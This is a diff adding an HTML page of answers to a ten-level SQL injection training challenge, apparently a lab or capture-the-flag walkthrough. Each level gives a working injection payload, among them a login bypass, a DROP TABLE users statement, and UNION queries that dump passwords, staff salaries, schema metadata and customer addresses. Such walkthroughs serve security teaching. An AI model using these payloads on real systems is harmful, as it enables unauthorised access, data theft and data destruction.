@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Challenge Solutions</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>SQL Injection Challenge Solutions</h1>
+        <nav>
+            <ul>
+                <li><a href="#level1">Level 1</a></li>
+                <li><a href="#level2">Level 2</a></li>
+                <li><a href="#level3">Level 3</a></li>
+                <li><a href="#level4">Level 4</a></li>
+                <li><a href="#level5">Level 5</a></li>
+                <li><a href="#level6">Level 6</a></li>
+                <li><a href="#level7">Level 7</a></li>
+                <li><a href="#level8">Level 8</a></li>
+                <li><a href="#level9">Level 9</a></li>
+                <li><a href="#level10">Level 10</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section id="content">
+        <div id="level1" class="level">
+            <h2>Level 1</h2>
+            <p><strong>Challenge:</strong> Try to log in as 'jane' without knowing her password.</p>
+            <p><strong>Solution:</strong> <code>jane'; --</code></p>
+            <p>Explanation: We set the username to jane and comment out the part where the program validates it.</p>
+        </div>
+
+        <div id="level2" class="level">
+            <h2>Level 2</h2>
+            <p><strong>Challenge:</strong> Drop table users.</p>
+            <p><strong>Solution:</strong> <code>' ; DROP TABLE users; --</code></p>
+            <p>Explanation: Close the username query, start the DROP TABLE query, and then comment out the rest.</p>
+        </div>
+
+        <div id="level3" class="level">
+            <h2>Level 3</h2>
+            <p><strong>Challenge:</strong> Log in with any username.</p>
+            <p><strong>Solution:</strong> <code>' OR 1=1; --</code></p>
+            <p>Explanation: This makes the query always true, logging in with any user.</p>
+        </div>
+
+        <div id="level4" class="level">
+            <h2>Level 4</h2>
+            <p><strong>Challenge:</strong> The program blocks multiple rows, limit to one row.</p>
+            <p><strong>Solution:</strong> <code>' OR 1=1 ORDER BY user_id LIMIT 1 --</code></p>
+            <p>Explanation: We limit the query to only one row to bypass the restriction.</p>
+        </div>
+
+        <div id="level5" class="level">
+            <h2>Level 5</h2>
+            <p><strong>Challenge:</strong> Output usernames and passwords of all users.</p>
+            <p><strong>Solution:</strong> <code>' UNION select username, password from users; --</code></p>
+            <p>Explanation: Using UNION to merge results and fetch usernames and passwords.</p>
+        </div>
+
+        <div id="level6" class="level">
+            <h2>Level 6</h2>
+            <p><strong>Challenge:</strong> There may be a staff table in the database.</p>
+            <p><strong>Solution:</strong> <code>' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' --</code></p>
+            <p>Explanation: The key is to continue the query and look for staff information.</p>
+        </div>
+
+        <div id="level7" class="level">
+            <h2>Level 7</h2>
+            <p><strong>Challenge:</strong> Output name, email, salary, and employed_since from the staff table.</p>
+            <p><strong>Solution:</strong> <code>' UNION SELECT name, email, salary, employed_since FROM staff --</code></p>
+            <p>Explanation: Using UNION to merge the queries and output the required staff details.</p>
+        </div>
+
+        <div id="level8" class="level">
+            <h2>Level 8</h2>
+            <p><strong>Challenge:</strong> Find out which database we are dealing with and output metadata.</p>
+            <p><strong>Solution (Oracle):</strong> <code>' UNION SELECT table_id, table_name, num_rows, null FROM sys.user_tables --</code></p>
+            <p><strong>Solution (MySQL, SQL Server, PostgreSQL):</strong> <code>' UNION SELECT table_name, table_type, table_rows, null FROM information_schema.tables --</code></p>
+            <p><strong>Solution (SQLLite):</strong> <code>' UNION SELECT type, name, tbl_name, null FROM sqlite_master --</code></p>
+            <p>Explanation: Different database systems use different tables to hold metadata. Try each one based on the system you're using.</p>
+        </div>
+
+        <div id="level9" class="level">
+            <h2>Level 9</h2>
+            <p><strong>Challenge:</strong> The database has a table called customers. Find out which columns it has.</p>
+            <p><strong>Solution:</strong> <code>' UNION SELECT table_name, column_name, data_type, null FROM information_schema.columns WHERE table_name = 'customers' --</code></p>
+            <p>Explanation: Use UNION to get column names and data types for the 'customers' table.</p>
+        </div>
+
+        <div id="level10" class="level">
+            <h2>Level 10</h2>
+            <p><strong>Challenge:</strong> Output the address, name, and email of the customer with id 3.</p>
+            <p><strong>Solution:</strong> <code>https://sql-insekten.example.com/index.php?product_id=0 UNION SELECT address, name, email FROM customers WHERE customer_id = 3</code></p>
+            <p>Explanation: This query selects the address, name, and email of the customer with id 3.</p>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 SQL Injection Solutions by Ali Rafid Nasserr</p>
+    </footer>
+
+    <script src="scripts.js"></script>
+</body>
+</html>
